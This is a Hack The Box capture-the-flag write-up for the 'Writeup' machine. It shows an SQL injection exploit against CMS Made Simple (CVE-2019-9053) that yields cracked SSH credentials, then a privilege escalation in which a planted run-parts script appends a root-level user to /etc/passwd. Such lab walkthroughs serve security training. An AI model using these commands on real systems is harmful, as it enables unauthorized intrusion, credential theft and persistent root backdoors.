---
clayout: ctf
title: Writeup
date: 2025-03-27
image: /ctf/hack-the-box/machines/writeup/info-card.png
type: Hack The Box

ctf:
    - name: Writeup
      link: https://app.hackthebox.com/machines/192
      thumbnail: /ctf/hack-the-box/machines/writeup/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/192
          thumbnail: /ctf/hack-the-box/machines/writeup/pwned.png
---

## Enumeration

### Nmap Scan

We begin by running a comprehensive Nmap scan to enumerate open ports and detect running services:

```bash
nmap -sC -sV -v -p- -oN writeup.nmap 10.10.10.138
```

**Scan Results:**

```bash
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
```

Port 22 and 80 are open but both return `tcpwrapped`, indicating access control mechanisms or limitations on banner grabbing.

### Web Enumeration

Navigating to `http://10.10.10.138/`, we are presented with a basic webpage:

![Homepage](/ctf/hack-the-box/machines/writeup/home.png)

Checking `robots.txt`, we discover a disallowed path:

![robots.txt](/ctf/hack-the-box/machines/writeup/robots.png)

The file discloses the `/writeup` directory, which appears to host a web application:

![Writeup Page](/ctf/hack-the-box/machines/writeup/writeup.png)

We use `whatweb` to fingerprint the application:

```bash
whatweb http://10.10.10.138/writeup/
```

![WhatWeb Output](/ctf/hack-the-box/machines/writeup/whatweb.png)

The application is identified as **CMS Made Simple**—an open-source PHP CMS. The footer indicates the version may date back to 2019.

Based on this, we research known vulnerabilities and discover [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053), which is an unauthenticated SQL injection vulnerability affecting CMS Made Simple version 2.2.9.

### Exploitation

We exploit the SQL injection using the publicly available script [Exploit-DB 46635](https://www.exploit-db.com/exploits/46635):

```bash
python3 46635.py -u "http://10.10.10.138/writeup/" -w /usr/share/wordlists/rockyou.txt -c
```

**Script Output:**

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password hash found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

With the credentials `jkr : raykayjay9`, we are able to access the machine via SSH:

```bash
ssh jkr@10.10.10.138
```

After logging in, we retrieve the user flag:

```bash
jkr@writeup:~$ cat user.txt
[USER_FLAG]
```

## Privilege Escalation

We check the group memberships for the `jkr` user:

![User Groups](/ctf/hack-the-box/machines/writeup/groups.png)

The user is part of the `staff` group, which may have access to sensitive directories or cron-related scripts. We refer to [this blog post](https://binaryregion.wordpress.com/2021/09/22/privilege-escalation-linux-staff-group/) explaining how this group can be leveraged for privilege escalation.

To monitor background activity, we run `pspy32`, a tool for process discovery:

![pspy Output](/ctf/hack-the-box/machines/writeup/pspy32.png)

We observe that a `run-parts` script is executed as **root** on a recurring schedule. This script executes all scripts in a given directory—offering an opportunity to inject malicious code.

### Crafting the Exploit

We replace or add a script in the expected `run-parts` path, such as `/usr/local/bin/run-parts`, to append a new root user into `/etc/passwd`:

```bash
#!/bin/bash
echo 'deejay:$1$deejay$4bbVUrgoKNqATEsKbF2d.0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Once triggered, the new user `deejay` with UID 0 is added.

We confirm the injection:

![Modified /etc/passwd](/ctf/hack-the-box/machines/writeup/passwd.png)

Now, we switch to the new root user:

```bash
su deejay
```

Access is granted, and we retrieve the root flag:

```bash
cat /root/root.txt
```

![Root Access](/ctf/hack-the-box/machines/writeup/root.png)
